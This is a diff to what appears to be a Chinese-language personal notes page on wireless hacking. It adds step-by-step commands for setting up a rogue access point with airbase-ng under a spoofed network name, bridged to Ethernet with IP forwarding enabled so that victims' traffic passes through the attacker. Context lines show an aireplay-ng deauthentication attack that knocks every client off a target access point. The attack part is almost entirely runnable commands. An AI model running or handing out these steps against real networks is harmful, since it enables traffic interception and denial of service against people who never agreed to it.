@@ -195,16 +195,29 @@
         5.2.4. 针对所有链接AP客户端发动解除验证攻击
             sudo aireplay-ng -0 5 -a (AP mac地址) --ignore-negative-one wlan0mon
     5.3. 无赖AP
+        5.3.1. 创建监听wlan0接口
+            sudo airmon-ng start wlan0
+        5.3.2. 创建无赖AP
+            sudo airbase-ng --essid "Danke-xxx" -c 6 wlan0mon
+        5.3.3. 搭建网桥接口
+            sudo apt-get install bridge-utils
+            sudo brctl addbr wifi-bridge
+        5.3.4. 将以太网接口和虚拟接口at0桥接
+            sudo brctl addif wifi-bridge eth0
+            sudo brctl addif wifi-bridge at0
+        5.3.5. 激活接口
+            sudo ifconfig eth0 0.0.0.0 up
+            sudo ifconfig at0 0.0.0.0 up
+        5.3.6. 激活kali linux的IP转发功能
+            sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+        5.3.7. 激活网桥
+            sudo ifconfig wifi-bridge up
 
 
 
 
 
-
-
-
-
-
+d
 
                         </code>
                     </pre>
